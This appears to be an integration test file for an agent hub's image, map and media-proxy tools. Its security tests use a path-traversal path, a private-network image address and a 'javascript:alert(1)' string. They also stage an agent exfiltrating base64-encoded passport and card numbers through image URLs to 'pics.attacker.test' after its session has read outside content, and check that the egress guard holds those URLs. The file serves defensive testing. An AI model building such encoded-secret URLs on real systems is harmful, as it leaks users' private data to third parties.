// End-to-end: an agent shows images and a map (core tools show_images / show_map), the web UI gets them as message
// parts, the channels get them as media, and the hub serves them through its own authenticated routes. Routes go to a
// stand-in OSRM server (PIOMIO_ROUTER_URL).
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { createServer } from "node:net";
import { createServer as createHttpServer, type Server } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Hub, loadConfig } from "../src/index.ts";
import { simplify } from "../src/routing.ts";

const fixtures = join(import.meta.dirname, "fixtures");
const PNG = Buffer.from("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489", "hex");

function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const s = createServer();
    s.once("error", reject);
    s.listen(0, "127.0.0.1", () => {
      const port = (s.address() as { port: number }).port;
      s.close(() => resolve(port));
    });
  });
}

async function until<T>(fn: () => Promise<T | undefined | false> | T | undefined | false, what: string, timeoutMs = 15_000): Promise<T> {
  const t0 = Date.now();
  while (Date.now() - t0 < timeoutMs) {
    const v = await fn();
    if (v) return v as T;
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error(`timed out waiting for ${what}`);
}

describe("agents show images and maps", () => {
  let hub: Hub;
  let base = "";
  let cookie = "";
  let csrf = "";
  let conv = "";
  const sent: any[] = [];

  const req = async (method: string, path: string, body?: unknown, auth = true) => {
    const r = await fetch(base + path, {
      method,
      headers: {
        origin: base,
        ...(body !== undefined ? { "content-type": "application/json" } : {}),
        ...(auth && cookie ? { cookie } : {}),
        ...(auth && csrf ? { "x-csrf": csrf } : {}),
      },
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    const sc = r.headers.get("set-cookie");
    if (sc) cookie = sc.split(";")[0];
    return r;
  };
  const json = async (method: string, path: string, body?: unknown) => {
    const r = await req(method, path, body);
    if (r.status >= 400) throw new Error(`${method} ${path} → ${r.status} ${await r.text()}`);
    return r.json();
  };

  /** Send `CALL tool args` and return the assistant reply once it is complete. */
  const call = async (tool: string, args: unknown) => {
    const m = await json("POST", `/api/conversations/${conv}/messages`, { text: `CALL ${tool} ${JSON.stringify(args)}` });
    return until(async () => {
      const msgs: any[] = await json("GET", `/api/conversations/${conv}/messages`);
      const after = msgs.slice(msgs.findIndex((x) => x.id === m.id) + 1);
      return after.find((x) => x.role === "assistant" && x.status === "complete" && x.parts.some((p: any) => p.type === "text" && p.text.startsWith("tool said:")));
    }, `reply to ${tool}`);
  };

  /** The stand-in router: what it was asked, and whether it is down. */
  const asked: string[] = [];
  let routerDown = false;
  let router: Server;

  beforeAll(async () => {
    const [port, consolePort, egressPort, routerPort] = [await freePort(), await freePort(), await freePort(), await freePort()];
    router = createHttpServer((req, res) => {
      asked.push(req.url ?? "");
      if (routerDown) {
        res.writeHead(503).end();
        return;
      }
      // Each stop, and a bend half way between each pair: the line the hub stores.
      const pts = /\/driving\/([^?]+)/.exec(req.url ?? "")![1].split(";").map((p) => p.split(",").map(Number));
      const line = pts.flatMap((p, n) => (n ? [[(pts[n - 1][0] + p[0]) / 2 + 0.001, (pts[n - 1][1] + p[1]) / 2], p] : [p]));
      res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ code: "Ok", routes: [{ distance: 2412.4, duration: 1830.2, geometry: { type: "LineString", coordinates: line } }] }));
    });
    await new Promise<void>((r) => router.listen(routerPort, "127.0.0.1", r));
    const config = loadConfig(
      {
        PIOMIO_PORT: String(port),
        PIOMIO_DEVICES: "0",
        PIOMIO_CONSOLE_PORT: String(consolePort),
        PIOMIO_EGRESS_PORT: String(egressPort),
        PIOMIO_ROUTER_URL: `http://127.0.0.1:${routerPort}`,
        TZ: "UTC",
      },
      { dataDir: mkdtempSync(join(tmpdir(), "owl-media-hub-")), builtinPluginsDirs: [join(fixtures, "plugins")], builtinAgentsDir: join(fixtures, "agents") },
    );
    hub = new Hub(config);
    await hub.start();
    base = config.publicUrl;
    await until(() => hub.brains.has("fake@local"), "the fake brain");
    await json("POST", "/api/auth/setup", { token: hub.auth.setupToken, password: "integration-pass-1" });
    const boot = await json("GET", "/api/bootstrap");
    csrf = boot.csrf;
    conv = boot.mainConversationId;
    // A phone channel: the main agent's replies to web messages are mirrored there.
    hub.channels.register("phone", "Phone", "phone-test", { closed: false, request: async (_m: string, p: any) => (sent.push(p.message), {}) } as any);
    // A chart the agent drew in its workspace.
    const ws = hub.runner.workspacePath({ agentId: "assistant", conversationId: conv });
    mkdirSync(ws, { recursive: true });
    writeFileSync(join(ws, "chart.png"), PNG);
    writeFileSync(join(ws, "notes.txt"), "not a picture");
  });

  afterAll(async () => {
    await hub?.stop();
    router?.close();
  });

  it("show_images adds a carousel to the reply and sends it to the channels", async () => {
    sent.length = 0;
    const reply = await call("show_images", {
      images: [
        { url: "https://img.example.com/owl.jpg", caption: "  A   barn owl ", alt: "Owl on a branch" },
        { path: "chart.png", caption: "Mice per night" },
      ],
    });
    const result = reply.parts.find((p: any) => p.type === "tool_result");
    expect(result.isError).toBeFalsy();
    expect(result.output).toMatch(/carousel of 2 images/);
    const images = reply.parts.findIndex((p: any) => p.type === "images");
    expect(reply.parts[images]).toEqual({
      type: "images",
      items: [
        { src: "https://img.example.com/owl.jpg", alt: "Owl on a branch", caption: "A barn owl" },
        { src: `file:assistant/${conv}/chart.png`, caption: "Mice per night" },
      ],
    });
    // In the reply where the tool was called: before the words that follow it.
    expect(images).toBeLessThan(reply.parts.findIndex((p: any) => p.type === "text"));

    const out = await until(() => sent.find((m) => m.media), "the mirrored reply with media");
    expect(out.media).toEqual([
      { kind: "image", url: "https://img.example.com/owl.jpg", caption: "A barn owl" },
      { kind: "image", data: PNG.toString("base64"), mimeType: "image/png", name: "chart.png", caption: "Mice per night" },
    ]);

    // The workspace file is served to the signed-in UI only.
    const file = await req("GET", `/api/files?path=${encodeURIComponent(`assistant/${conv}/chart.png`)}`);
    expect(file.status).toBe(200);
    expect(Buffer.from(await file.arrayBuffer())).toEqual(PNG);
  });

  it("show_images refuses files outside the workspace, non-images and bad addresses", async () => {
    const bad = async (images: unknown[]) => (await call("show_images", { images })).parts.find((p: any) => p.type === "tool_result");
    for (const [images, why] of [
      [[{ path: "../../../piomio.db" }], /outside your workspace|no such file/],
      [[{ path: "notes.txt" }], /not an image/],
      [[{ path: "missing.png" }], /no such file/],
      [[{ url: "ftp://example.com/x.png" }], /public http\(s\) address/],
      [[{ caption: "nothing" }], /give url or path/],
      [Array.from({ length: 11 }, () => ({ url: "https://img.example.com/a.png" })), /At most 10/],
    ] as const) {
      const r = await bad(images as unknown[]);
      expect(r.isError, JSON.stringify(images).slice(0, 60)).toBe(true);
      expect(r.output).toMatch(why);
    }
  });

  it("a task's picture reaches the dialog that started it, and the dialog can show a file from its task's folder", async () => {
    const task = hub.store.createTask({ agentId: "assistant", title: "Render", goal: "x", createdBy: "agent", background: false, parentConversationId: conv });
    const taskWs = hub.runner.workspacePath({ agentId: "assistant", taskId: task.id, conversationId: task.conversationId });
    mkdirSync(join(taskWs, "out"), { recursive: true });
    writeFileSync(join(taskWs, "out", "render.png"), PNG);
    const ctx = (over: Record<string, unknown>) => ({ sessionId: "s", agentId: "assistant", callId: "c", tainted: false, background: false, machineId: "local", ...over }) as any;
    const show = (input: unknown, over: Record<string, unknown>) => hub.tools.get("show_images")!.invoke(input, ctx(over));

    // Shown inside the task: in the task, and under the task's line in the dialog the person reads.
    expect((await show({ images: [{ path: "out/render.png", caption: "Render" }] }, { conversationId: task.conversationId, taskId: task.id, workspace: taskWs })).isError).toBeFalsy();
    const inDialog = hub.store.listMessages(conv, { limit: 500 }).find((m) => m.parts.some((p) => p.type === "task" && p.taskId === task.id) && m.parts.some((p) => p.type === "images"));
    expect(inDialog?.parts.find((p) => p.type === "images")).toMatchObject({ items: [{ caption: "Render" }] });

    // A full-size PNG render goes as it is (11 MB); past 30 MB it does not.
    writeFileSync(join(taskWs, "out", "big.png"), Buffer.concat([PNG, Buffer.alloc(11 * 1024 * 1024)]));
    expect((await show({ images: [{ path: "out/big.png" }] }, { conversationId: task.conversationId, taskId: task.id, workspace: taskWs })).isError).toBeFalsy();
    writeFileSync(join(taskWs, "out", "huge.png"), Buffer.concat([PNG, Buffer.alloc(31 * 1024 * 1024)]));
    expect((await show({ images: [{ path: "out/huge.png" }] }, { conversationId: task.conversationId, taskId: task.id, workspace: taskWs })).content[0]).toMatchObject({
      text: expect.stringContaining("larger than 30 MB"),
    });

    // The dialog shows what its task made, by the file's full path; a folder that is not its own or its tasks' stays closed.
    const dialogWs = hub.runner.workspacePath({ agentId: "assistant", conversationId: conv });
    expect((await show({ images: [{ path: join(taskWs, "out", "render.png") }] }, { conversationId: conv, workspace: dialogWs })).isError).toBeFalsy();
    const stranger = hub.runner.workspacePath({ agentId: "other", conversationId: "c_other" });
    mkdirSync(stranger, { recursive: true });
    writeFileSync(join(stranger, "x.png"), PNG);
    const r = await show({ images: [{ path: join(stranger, "x.png") }] }, { conversationId: conv, workspace: dialogWs });
    expect(r.isError).toBe(true);
    expect(r.content[0]).toMatchObject({ text: expect.stringMatching(/outside your workspace and your tasks' folders/) });
  });

  it("show_map adds a map with markers and a location for the channels", async () => {
    sent.length = 0;
    const reply = await call("show_map", {
      lat: 48.8584,
      lon: 2.2945,
      title: "Eiffel Tower",
      markers: [
        { lat: 48.8584, lon: 2.2945, label: "Tower" },
        { lat: 48.8606, lon: 2.3376, label: "Louvre" },
      ],
    });
    expect(reply.parts.find((p: any) => p.type === "map")).toEqual({
      type: "map",
      lat: 48.8584,
      lon: 2.2945,
      title: "Eiffel Tower",
      markers: [
        { lat: 48.8584, lon: 2.2945, label: "Tower" },
        { lat: 48.8606, lon: 2.3376, label: "Louvre" },
      ],
    });
    const out = await until(() => sent.find((m) => m.media), "the mirrored reply with the map");
    expect(out.media).toEqual([{ kind: "map", lat: 48.8584, lon: 2.2945, title: "Eiffel Tower" }]);

    const bad = (await call("show_map", { lat: 91, lon: 0 })).parts.find((p: any) => p.type === "tool_result");
    expect(bad.isError).toBe(true);
    expect(bad.output).toMatch(/lat must be a number from -90 to 90/);
    const zoom = (await call("show_map", { lat: 1, lon: 2, zoom: 25 })).parts.find((p: any) => p.type === "tool_result");
    expect(zoom.output).toMatch(/zoom must be a number from 1 to 19/);
  });

  it("show_map draws places with symbols and a route along roads, with its length and time", async () => {
    asked.length = 0;
    const reply = await call("show_map", {
      title: "Evening walk",
      markers: [
        { lat: 43.2567, lon: 76.9286, label: "Hotel Kazakhstan", icon: "hotel", note: "Dostyk Ave 52" },
        { lat: 43.2389, lon: 76.9455, label: "Kok-Tobe", icon: "sight" },
        { lat: 43.25, lon: 76.95, label: "Coffee", icon: "cafe" },
      ],
      route: { mode: "walk", stops: [0, 2, 1] },
    });
    const map = reply.parts.find((p: any) => p.type === "map");
    expect(map).toMatchObject({ title: "Evening walk", lat: 43.2478, lon: 76.9393, route: { mode: "walk", stops: [0, 2, 1], distanceM: 2412, durationS: 1830 } });
    expect(map.markers[0]).toEqual({ lat: 43.2567, lon: 76.9286, label: "Hotel Kazakhstan", note: "Dostyk Ave 52", icon: "hotel" });
    // Asked for the foot profile, lon,lat in stop order; the line has the bends between the stops, as [lat, lon].
    expect(asked).toEqual(["/routed-foot/route/v1/driving/76.9286,43.2567;76.95,43.25;76.9455,43.2389?overview=full&geometries=geojson"]);
    expect(map.route.path).toHaveLength(5);
    expect(map.route.path[0]).toEqual([43.2567, 76.9286]);
    expect(reply.parts.find((p: any) => p.type === "tool_result").output).toMatch(/Route: 2\.4 km, about 31 min\.$/);
  });

  it("show_map draws transit, and a route the router could not find, straight between the stops", async () => {
    asked.length = 0;
    const markers = [
      { lat: 1, lon: 2 },
      { lat: 3, lon: 4 },
    ];
    const transit = (await call("show_map", { markers, route: { mode: "transit" } })).parts.find((p: any) => p.type === "map");
    expect(transit.route).toEqual({ mode: "transit", stops: [0, 1], path: [[1, 2], [3, 4]] });
    expect(asked).toEqual([]);

    routerDown = true;
    try {
      const r = await call("show_map", { markers, route: { mode: "drive" } });
      expect(r.parts.find((p: any) => p.type === "map").route).toEqual({ mode: "drive", stops: [0, 1], path: [[1, 2], [3, 4]] });
      expect(r.parts.find((p: any) => p.type === "tool_result").output).toMatch(/No road route \(the router answered 503\): the line is straight between the stops\.$/);
    } finally {
      routerDown = false;
    }
    for (const [args, why] of [
      [{ markers, route: { mode: "fly" } }, /route\.mode must be walk, drive, bike or transit/],
      [{ markers, route: { mode: "walk", stops: [0, 5] } }, /route\.stops are marker indexes from 0 to 1/],
      [{ markers: [markers[0]], route: { mode: "walk" } }, /at least two markers/],
      [{ markers: [{ lat: 1, lon: 2, icon: "dragon" }] }, /markers\[0\]\.icon must be one of: pin, food/],
      [{ title: "nowhere" }, /Give lat and lon, or markers/],
    ] as const) {
      const out = (await call("show_map", args)).parts.find((p: any) => p.type === "tool_result");
      expect(out.isError, JSON.stringify(args)).toBe(true);
      expect(out.output).toMatch(why);
    }
  });

  it("keeps a long route line short enough for a message, ends included", () => {
    const wiggly = Array.from({ length: 5000 }, (_, n) => [43 + n * 0.0001, 76 + Math.sin(n / 3) * 0.0005] as [number, number]);
    const short = simplify(wiggly, 400);
    expect(short.length).toBeLessThanOrEqual(400);
    expect(short.length).toBeGreaterThan(50);
    expect(short[0]).toEqual(wiggly[0]);
    expect(short.at(-1)).toEqual(wiggly.at(-1));
  });

  it("serves proxied images and map tiles to the signed-in UI, with checks", async () => {
    // What the proxy fetched before (no network in tests): the cache answers.
    const url = "https://img.example.com/owl.jpg";
    const key = createHash("sha256").update(url).digest("hex");
    const mediaDir = join(hub.config.dataDir, "cache", "media");
    mkdirSync(mediaDir, { recursive: true });
    writeFileSync(join(mediaDir, key), PNG);
    writeFileSync(join(mediaDir, `${key}.type`), "image/png");
    const tileDir = join(hub.config.dataDir, "cache", "tiles", "3", "4");
    mkdirSync(tileDir, { recursive: true });
    writeFileSync(join(tileDir, "2.png"), PNG);

    const img = await req("GET", `/api/media?url=${encodeURIComponent(url)}`);
    expect(img.status).toBe(200);
    expect(img.headers.get("content-type")).toBe("image/png");
    expect(img.headers.get("content-security-policy")).toMatch(/sandbox/);
    expect(Buffer.from(await img.arrayBuffer())).toEqual(PNG);
    const tile = await req("GET", "/api/map/tiles/3/4/2.png");
    expect(tile.status).toBe(200);
    expect(Buffer.from(await tile.arrayBuffer())).toEqual(PNG);

    expect((await req("GET", `/api/media?url=${encodeURIComponent(url)}`, undefined, false)).status).toBe(401);
    expect((await req("GET", "/api/map/tiles/3/4/2.png", undefined, false)).status).toBe(401);
    expect((await req("GET", "/api/media?url=ftp%3A%2F%2Fexample.com%2Fa.png")).status).toBe(400);
    expect((await req("GET", "/api/media")).status).toBe(400);
    // A picture the hub may fetch, which still may not reach into the private network.
    hub.pictures.trust(["http://127.0.0.1:1/x.png"]);
    const priv = await req("GET", `/api/media?url=${encodeURIComponent("http://127.0.0.1:1/x.png")}`);
    expect(priv.status).toBe(403);
    expect((await priv.json()).error).toBe("This image address points into a private network");
    for (const p of ["20/0/0.png", "3/8/0.png", "3/0/8.png", "x/0/0.png", "3/4/2.jpg"]) {
      expect((await req("GET", `/api/map/tiles/${p}`)).status, p).toBe(400);
    }
  });

  it("a picture in a reply is fetched only when the hub decided to show it; a held one waits for the person's Show", async () => {
    const pic = (token: string) => `https://pics.attacker.test/p.png?d=${token}`;
    const media = (url: string, extra = "") => req("GET", `/api/media?url=${encodeURIComponent(url)}${extra}`);
    /** Send words and wait for the agent's complete reply to them. */
    const say = async (text: string) => {
      const m = await json("POST", `/api/conversations/${conv}/messages`, { text });
      return until(async () => {
        const msgs: any[] = await json("GET", `/api/conversations/${conv}/messages`);
        return msgs.slice(msgs.findIndex((x) => x.id === m.id) + 1).find((x) => x.role === "assistant" && x.status === "complete");
      }, `reply to ${text}`);
    };
    // No network in tests: the proxy's fetch answers here, and says what it was asked for.
    const fetched: string[] = [];
    const image = vi.spyOn(hub.media, "image").mockImplementation(async (raw: unknown) => (fetched.push(String(raw)), { data: PNG, type: "image/png" }));
    // What the hub knew about the picture when the delta that finishes its address went to the clients.
    const atDelta: Array<string | undefined> = [];
    const off = hub.bus.on("message.delta", (e) => {
      const token = /^(\S+)\)$/.exec(e.delta)?.[1];
      if (token) atDelta.push(hub.pictures.state(pic(token)));
    });
    try {
      // Before the session read anything from outside: its pictures are its own choice.
      expect((await say("PICTURE c1ean")).parts.find((p: any) => p.type === "text").text).toContain(`![p](${pic("c1ean")})`);
      expect(hub.pictures.state(pic("c1ean"))).toBe("shown");
      expect((await media(pic("c1ean"))).status).toBe(200);
      expect(fetched).toEqual([pic("c1ean")]);

      // After outside content: an address the agent put together, to a host nobody named, carrying an encoded value.
      const sid = hub.store.activeSession(conv, "assistant")!.id;
      hub.store.updateSession(sid, { tainted: true });
      const secret = Buffer.from("passport 4510 123456").toString("base64").replace(/=+$/, "");
      await say(`PICTURE ${secret}`);
      expect(hub.pictures.state(pic(secret))).toBe("held");
      const held = await media(pic(secret));
      expect(held.status).toBe(403);
      expect((await held.json()).error).toMatch(/held/);
      expect((await media(pic(secret), "&from=plugin")).status).toBe(403);
      expect(await json("GET", `/api/media/state?url=${encodeURIComponent(pic(secret))}`)).toEqual({ held: true });
      expect(fetched).toEqual([pic("c1ean")]);
      // Decided before any client could show it.
      expect(atDelta).toEqual(["shown", "held"]);

      // The same session, a picture found in what it read: shown.
      hub.egressGuard.read(sid, `<img src="${pic("f0und")}"> Picture: ${pic("f0und")}`);
      await say("PICTURE f0und");
      expect(hub.pictures.state(pic("f0und"))).toBe("shown");

      // The person taps Show: from then on the proxy fetches it, and the security log says who asked.
      expect(await json("POST", "/api/media/show", { url: pic(secret) })).toEqual({ ok: true });
      expect((await media(pic(secret))).status).toBe(200);
      expect(fetched).toContain(pic(secret));
      expect(hub.audit.list({ action: "media.show" })[0]).toMatchObject({ actor: "user", target: "pics.attacker.test" });
      expect((await req("POST", "/api/media/show", { url: "javascript:alert(1)" })).status).toBe(400);
      expect((await req("GET", `/api/media/state?url=${encodeURIComponent("javascript:alert(1)")}`)).status).toBe(400);

      // A picture the hub never decided: refused, except an earlier copy (nothing goes out) and a plugin's own UI.
      const never = "https://never.example.org/x.png";
      expect((await media(never)).status).toBe(403);
      expect((await media(never, "&from=plugin")).status).toBe(200);
      const copy = "https://old.example.org/cached.png";
      const key = createHash("sha256").update(copy).digest("hex");
      writeFileSync(join(hub.config.dataDir, "cache", "media", key), PNG);
      writeFileSync(join(hub.config.dataDir, "cache", "media", `${key}.type`), "image/png");
      const before = fetched.length;
      expect((await media(copy)).status).toBe(200);
      expect(fetched.length).toBe(before);

      // The person's own picture is theirs to show: decided as their message is stored.
      const mine = say("look ![me](https://mine.example.org/me.png)");
      await until(() => hub.pictures.state("https://mine.example.org/me.png"), "the person's picture");
      expect(hub.pictures.state("https://mine.example.org/me.png")).toBe("shown");
      await mine;

      // A tool's pictures are decided as it is called; a held one does not go to the phone (its servers would fetch it).
      const carousel = `https://pics.attacker.test/carousel.png?d=${secret}`;
      expect((await hub.gateway.call(sid, "show_images", { images: [{ url: carousel }, { url: pic("f0und") }] })).isError).toBeFalsy();
      expect(hub.pictures.state(carousel)).toBe("held");
      const withImages = hub.store.listMessages(conv, { limit: 500 }).filter((m) => m.parts.some((p) => p.type === "images" && p.items.some((it) => it.src === carousel))).at(-1)!;
      expect(await (hub.runner as any).replyMedia(withImages.id)).toEqual([{ kind: "image", url: pic("f0und") }]);
    } finally {
      off();
      image.mockRestore();
    }
  });

  it("a reply goes to the phone with a preview only of a link that carries nothing out", async () => {
    const pic = (token: string) => `https://pics.attacker.test/p.png?d=${token}`;
    /** Send words and wait for the reply the phone got for them. */
    const mirrored = async (text: string, mark: string) => {
      sent.length = 0;
      await json("POST", `/api/conversations/${conv}/messages`, { text });
      return until(() => sent.find((m) => m.kind === "reply" && m.text.includes(mark)), `the phone's copy of ${mark}`);
    };
    const sid = hub.store.activeSession(conv, "assistant")!.id;
    // Before outside content: the reply's first link, as written.
    hub.store.updateSession(sid, { tainted: false });
    expect((await mirrored("PICTURE pr3view", "pr3view")).preview).toBe(pic("pr3view"));

    // After: an address the agent put together goes without a preview, and nobody is asked.
    hub.store.updateSession(sid, { tainted: true });
    const secret = Buffer.from("card 4400 1234 5678 9012").toString("base64").replace(/=+$/, "");
    const leaked = await mirrored(`PICTURE ${secret}`, secret);
    expect(leaked.preview).toBeUndefined();
    expect(hub.approvals.list(["pending"]).filter((a) => a.sessionId === sid)).toEqual([]);

    // A link found in what the session read, or one the person gave: previewed.
    hub.egressGuard.read(sid, `Photo of the day: ${pic("f0und2")}`);
    expect((await mirrored("PICTURE f0und2", "f0und2")).preview).toBe(pic("f0und2"));
    const story = "https://news.example.org/2026/11/02/story";
    expect((await mirrored(`what about ${story}?`, story)).preview).toBe(story);
  });
});
